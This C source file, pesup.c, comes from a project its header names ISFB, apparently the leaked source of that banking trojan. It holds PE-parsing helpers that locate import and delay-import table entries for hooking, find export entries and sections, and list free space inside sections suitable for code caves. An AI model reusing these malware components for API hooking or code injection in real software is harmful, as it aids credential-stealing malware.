//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: pesup.c
// $Revision: 396 $
// $Date: 2014-11-09 23:33:22 +0300 (Вс, 09 ноя 2014) $
// description: 
//	PE file header support functions and types.

#include "Common.h"


static PIAT_ENTRY ImportScanLoop(
	PCHAR	ModuleBase, 
	ULONG	SizeOfImage,
	PCHAR	pFunctionName, 
	ULONG   rvaINT,
	ULONG   rvaIAT,
	BOOL	bDelayImport,
	PCHAR*	ppName
	)
{
	PIAT_ENTRY	pIatEntry = NULL;
	PIMAGE_IMPORT_BY_NAME   pOrdinalName;
	PIMAGE_THUNK_DATA		pINT;
	PIMAGE_THUNK_DATA		pIAT;

	if (!rvaINT && !(rvaINT = rvaIAT))
		// No Characteristics and no FirstThunk field
		return(NULL);
        
	// RVA to VA
	pINT = (PIMAGE_THUNK_DATA)PeSupRvaToVa(rvaINT, ModuleBase);		
	pIAT = (PIMAGE_THUNK_DATA)PeSupRvaToVa(rvaIAT, ModuleBase);

	while (TRUE) // Loop forever (or until we break out)
	{
		if ( pINT->u1.AddressOfData == 0 )
			break;

		if (IMAGE_SNAP_BY_ORDINAL((ULONG_PTR)pFunctionName))
		{
			// There's on ordinal number instead of a name specified
			if (IMAGE_SNAP_BY_ORDINAL(pINT->u1.Ordinal) && pINT->u1.Ordinal == (ULONG_PTR)pFunctionName)
			{
				pIatEntry = &pIAT->u1.Function;
				if (ppName)
					*(PVOID*)ppName = &pINT->u1.Ordinal;
				break;  // Found, leaving
			}
		}
		else
		{
			// Import by a function name
			if (!IMAGE_SNAP_BY_ORDINAL(pINT->u1.Ordinal))
			{
#ifndef _WIN64
				if (bDelayImport &&
					(ULONG_PTR)pINT->u1.AddressOfData >= (ULONG_PTR)ModuleBase && 
					(ULONG_PTR)pINT->u1.AddressOfData < (ULONG_PTR)(ModuleBase + SizeOfImage))
					pOrdinalName = (PIMAGE_IMPORT_BY_NAME)(ULONG_PTR)pINT->u1.AddressOfData;
				else
#endif
					pOrdinalName = (PIMAGE_IMPORT_BY_NAME)PeSupRvaToVa((ULONG)pINT->u1.AddressOfData, ModuleBase);

				if (!_stricmp((PCHAR)&pOrdinalName->Name, pFunctionName))
				{	
					pIatEntry = &pIAT->u1.Function;
					if (ppName)
						*ppName = (PCHAR)&pOrdinalName->Name;
					break;  // Found, leaving
				}
			}
			else if( pINT->u1.Ordinal >= (ULONG_PTR)ModuleBase && pINT->u1.Ordinal < ((ULONG_PTR)ModuleBase + SizeOfImage))
			{
				pOrdinalName = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)pINT->u1.AddressOfData);
				if ( pOrdinalName ) 
				{
					if (!_stricmp((PCHAR)&pOrdinalName->Name, pFunctionName)) 
					{	
						pIatEntry = &pIAT->u1.Function;
						if (ppName)
							*ppName = (PCHAR)&pOrdinalName->Name;
						break;  // Found, leaving
					}
				}
			}
		}

		pINT++;         // advance to next thunk
		pIAT++;         // advance to next thunk
	} // while (TRUE)	

	return(pIatEntry);
}


//
//	Searches for IAT entry of a specified function within a specified module. Returns pointer to the IAT entry 
//	 or NULL if no such function found within module import.
//
PIAT_ENTRY PeSupGetIatEntry (
	HMODULE				TargetModule,		// ImageBase of the target module (where Iat entry should be found)
	PCHAR				ImportedModule,		// name of imported module
	PCHAR				ImportedFunction,	// name of imported function
	PTR_IS_IAT_ENTRY	pIsIatEntry,		// (OPTIONAL) pointer to a function that matches an IAT entry with the function name
	PCHAR*				ppName				// receives pointer to the name of the found function within the target module import table
	)
{
	PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
	ULONG                    importsStartRVA;
	PCHAR                    ModuleName;
	PIAT_ENTRY               pIatEntry = NULL;
	PCHAR					 ModuleBase = (PCHAR)TargetModule;

	PIMAGE_NT_HEADERS	PEHeader = (PIMAGE_NT_HEADERS)PeSupGetImagePeHeader(ModuleBase);

	// Get the import table RVA from the data dir
	importsStartRVA = 
		PEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

	if ( !importsStartRVA )
		return NULL;

	pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)PeSupRvaToVa(importsStartRVA, ModuleBase);

	if ( !pImportDesc )
		return NULL;

	// Find the import descriptor containing references to callee's functions
	for (; pImportDesc->Name; pImportDesc++) 
	{
		
		if(ModuleName = (PCHAR)PeSupRvaToVa(pImportDesc->Name, ModuleBase))
		{
			if ((ImportedModule == NULL) || (_stricmp(ModuleName, ImportedModule) == 0))
			{
			   // Target imported module found

				if (pImportDesc->OriginalFirstThunk != 0)
				{
					pIatEntry = ImportScanLoop(ModuleBase, PEHeader->OptionalHeader.SizeOfImage, ImportedFunction, 
						pImportDesc->OriginalFirstThunk, pImportDesc->FirstThunk, FALSE, ppName);
				}
				else
				{
					// There's the IAT allocated over the Ordinal table. This means the Ordinal table is already trashed by
					//  the IAT. We cannot just upload it from the source file because the source file can be packed.
					// So we have to scan the IAT and search for the corresponding values within our hooks. 
					if (pIsIatEntry)
					{
						PIAT_ENTRY pNewEntry = (PIAT_ENTRY)PeSupRvaToVa(pImportDesc->FirstThunk, ModuleBase);

						while(*pNewEntry)
						{
							if ((pIsIatEntry)((PVOID)*pNewEntry, ImportedFunction))
							{
								pIatEntry = pNewEntry;
								break;
							}
							pNewEntry += 1;
						}	// while(*pNewEntry)
					}	//	if (pIsIatEntry)
				}	// else	// if (pImportDesc->OriginalFirstThunk != 0)

				if (pIatEntry)
					break;
			} // if ((ImportedModule == NULL) ||
		} // if(ModuleName = (PCHAR)PeSupRvaToVa
	} // for (; pImportDesc->Name; pImportDesc++) 
	return(pIatEntry);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Searches for delay IAT entry of a specified function within a specified module. Returns pointer to the IAT entry 
//	 or NULL if no such function found within module import.
//
PIAT_ENTRY PeSupGetDelayIatEntry (
	HMODULE	TargetModule,		// ImageBase of the target module (where Iat entry should be found)
	PCHAR   ImportedModule,		// name of imported module
	PCHAR   ImportedFunction,	// name of imported function
	PCHAR*	ppName				// receives pointer to the name of the found function within the target module import table
	)
{
	PIMAGE_DELAY_IMPORT_DESCRIPTOR pImportDesc;
	ULONG                    importsStartRVA;
	PCHAR                    ModuleName;
	PIAT_ENTRY               pIatEntry = NULL;
	PCHAR					 ModuleBase = (PCHAR)TargetModule;

	PIMAGE_NT_HEADERS	PEHeader = (PIMAGE_NT_HEADERS)PeSupGetImagePeHeader(ModuleBase);
	ULONG	SizeOfImage = PEHeader->OptionalHeader.SizeOfImage;

	// Get the import table RVA from the data dir
	importsStartRVA = 
		PEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].VirtualAddress;

	if ( !importsStartRVA )
		return NULL;

	pImportDesc = (PIMAGE_DELAY_IMPORT_DESCRIPTOR)PeSupRvaToVa(importsStartRVA, ModuleBase);

	// Find the import descriptor containing references to callee's functions
	for (; pImportDesc->Name; pImportDesc++) 
	{
#ifndef _WIN64
		// There can be a VA instead of an RVA on x86
		if ((ULONG_PTR)pImportDesc->Name >= (ULONG_PTR)ModuleBase && (ULONG_PTR)pImportDesc->Name < (ULONG_PTR)(ModuleBase + SizeOfImage))
			ModuleName = (PCHAR)(ULONG_PTR)pImportDesc->Name;
		else
#endif
			ModuleName = (PCHAR)PeSupRvaToVa(pImportDesc->Name, ModuleBase);

		if ((ImportedModule == NULL) || (_stricmp(ModuleName, ImportedModule) == 0))
		{
			ULONG RvaInt, RvaIat;

			RvaInt = pImportDesc->OriginalFirstThunk;
			RvaIat = pImportDesc->FirstThunk;
#ifndef _WIN64
			// There can be a VA instead of an RVA on x86
			if ((ULONG_PTR)RvaInt >= (ULONG_PTR)ModuleBase && (ULONG_PTR)RvaInt < (ULONG_PTR)(ModuleBase + SizeOfImage) &&
				(ULONG_PTR)RvaIat >= (ULONG_PTR)ModuleBase && (ULONG_PTR)RvaIat < (ULONG_PTR)(ModuleBase + SizeOfImage))
			{
				// This is a VA
				RvaInt = (ULONG)((ULONG_PTR)RvaInt - (ULONG_PTR)ModuleBase);
				RvaIat = (ULONG)((ULONG_PTR)RvaIat - (ULONG_PTR)ModuleBase);
			}
#endif
			pIatEntry = ImportScanLoop(ModuleBase, SizeOfImage, ImportedFunction, RvaInt, RvaIat, TRUE, ppName);

			if ((pIatEntry) || (ImportedModule != NULL))
				break;
		} // if ((ImportedModule == NULL) ||
	} // for (; pImportDesc->Name; pImportDesc++) 

	return(pIatEntry);
}


PIMAGE_EXPORT_DIRECTORY PeSupGetImageExportDirectory(PCHAR ModuleBase)
{
	PIMAGE_NT_HEADERS32		PEHeader32	= (PIMAGE_NT_HEADERS32)PeSupGetImagePeHeader(ModuleBase);
	PIMAGE_NT_HEADERS64		PEHeader64	= (PIMAGE_NT_HEADERS64)PEHeader32;
	PIMAGE_EXPORT_DIRECTORY	ExportDirectory;

	if (PEHeader32->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64)
		ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ModuleBase + PEHeader64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	else
		ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ModuleBase + PEHeader32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );

	return(ExportDirectory);
}



//
//	Searches for Export table entry of a specified function within a specified module. Returns pointer to the found entry 
//	 or NULL if no such function found within module export.
//
PEXPORT_ENTRY	PeSupGetExportEntry( 
	IN	HMODULE	TargetModule,		// Image base of the target module (where exported function located)
	IN	PCHAR	ExportedFunction,	// exported function name to search
	OUT	PCHAR*	ppName				// receives pointer to the name of the found function within the target module export table
	)
{
	PIMAGE_EXPORT_DIRECTORY pExpDir	= NULL;
	PULONG	ppFunctions	= NULL,	ppNames	= NULL;
	PUSHORT	pOrdinals = NULL;
	ULONG	NumberOfNames = 0, OldPointer = 0, i;

	NTSTATUS ntStatus = STATUS_SUCCESS;
	PCHAR	 ModuleBase = (PCHAR)TargetModule;
	
	PEXPORT_ENTRY	FoundEntry				= NULL;
	PIMAGE_NT_HEADERS PEHeader	= (PIMAGE_NT_HEADERS)PeSupGetImagePeHeader(ModuleBase);

	// Get export directory
	pExpDir = PeSupGetImageExportDirectory(ModuleBase);

	if (pExpDir == NULL || pExpDir->AddressOfFunctions == 0 || pExpDir->AddressOfNames == 0 )
		return NULL;

	// Get names, functions and ordinals arrays pointers
	ppFunctions = (PULONG) (ModuleBase + (ULONG)pExpDir ->AddressOfFunctions );
	ppNames = (PULONG) (ModuleBase + (ULONG)pExpDir ->AddressOfNames );
	pOrdinals = (PUSHORT) (ModuleBase + (ULONG)pExpDir ->AddressOfNameOrdinals );

	NumberOfNames = pExpDir->NumberOfNames;

	// Walk the export table entries
	for ( i = 0; i < NumberOfNames; ++i )
	{
		// Check if function name matches current entry
		if   (!lstrcmpA(ModuleBase + *ppNames, ExportedFunction))
		{
			FoundEntry = (PEXPORT_ENTRY)&ppFunctions[*pOrdinals];
			if (ppName)
				*ppName = (PCHAR)(ModuleBase + *ppNames);
			break;
		}
		ppNames++;
		pOrdinals++;
	}

	return(FoundEntry);
}

//
//	Returns list of buffers specifying free space within PE sections with the specified SectionFlags.
//
PLINKED_BUFFER PeSupGetSectionFreeBuffers(
	IN	HMODULE	TargetModule,	// module to scan sections within
	IN	ULONG	SectionFlags	// section flags
	)
{
	PLINKED_BUFFER FirstBuf = NULL;
	PLINKED_BUFFER LastBuf = NULL;
	PLINKED_BUFFER NewBuf = NULL;
	PCHAR DosHeader = (PCHAR)TargetModule;
	PIMAGE_NT_HEADERS Pe = (PIMAGE_NT_HEADERS)(DosHeader + ((PIMAGE_DOS_HEADER)DosHeader)->e_lfanew);
	PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(Pe);
	ULONG NumberOfSections = Pe->FileHeader.NumberOfSections;

	do 
	{
		if (Section->Characteristics & SectionFlags)
		{
			ULONG	RealSize = _ALIGN(Section->SizeOfRawData, Pe->OptionalHeader.FileAlignment);
			ULONG	VirtualSize = max(_ALIGN(Section->Misc.VirtualSize, PAGE_SIZE), _ALIGN(RealSize, PAGE_SIZE));
			ULONG	BufferSize;

			if (Section->Characteristics & IMAGE_SCN_MEM_DISCARDABLE)			
				RealSize = 0;
			
			BufferSize = VirtualSize - RealSize;

			if ((BufferSize) && (NewBuf = (PLINKED_BUFFER)AppAlloc(sizeof(LINKED_BUFFER))))
			{
				NewBuf->Next = NULL;
				NewBuf->Buffer = DosHeader + Section->VirtualAddress + RealSize;
				NewBuf->Size = BufferSize;
				if (FirstBuf == NULL)
					FirstBuf = NewBuf;
				else
					LastBuf->Next = NewBuf;
				LastBuf = NewBuf;
			}
		}	// if (Section->Characteristics & SectionFlags)
		Section += 1;
		NumberOfSections -= 1;
	} while (NumberOfSections);
	return(FirstBuf);
}

//
//	Returns file offset of the specified RVA within the specified PE module.
//
ULONG PeSupRvaToFileOffset(
	HMODULE	hModule,
	ULONG	Rva
	)
{
	PIMAGE_NT_HEADERS Pe = (PIMAGE_NT_HEADERS)((PCHAR)hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);
	PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(Pe);
	USHORT	NumberOfSections = Pe->FileHeader.NumberOfSections;
	ULONG	Offset = 0;

	do
	{
		ULONG	RealSize = _ALIGN(pSection->SizeOfRawData, Pe->OptionalHeader.FileAlignment);
		ULONG	VirtualAddress = pSection->VirtualAddress;

		if (Rva >= VirtualAddress && Rva < (VirtualAddress + RealSize))
		{
			Offset = Rva - VirtualAddress + pSection->PointerToRawData;
			break;
		}
		pSection += 1;
	} while(NumberOfSections -= 1);

	return(Offset);
}


//
//	Searches for the PE section with the specified name within the specified target image
//
PVOID PeSupFindSectionByName(
	PCHAR			DosHeader,	// target image base
	PSECTION_NAME	SecName		// name of the section to look for
	)
{
	PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS)(DosHeader + ((PIMAGE_DOS_HEADER)DosHeader)->e_lfanew);
	ULONG NumberOfSections = pe->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pe);
	PVOID pFound = NULL;

	do
	{
		PSECTION_NAME pName = (PSECTION_NAME)&pSection->Name;
		if (pName->Dword[0] == SecName->Dword[0] && pName->Dword[1] == SecName->Dword[1])
			pFound = (PVOID)pSection;

		pSection += 1;
		NumberOfSections -=1;
	} while((NumberOfSections) && (pFound == NULL));
	
	return(pFound);
}
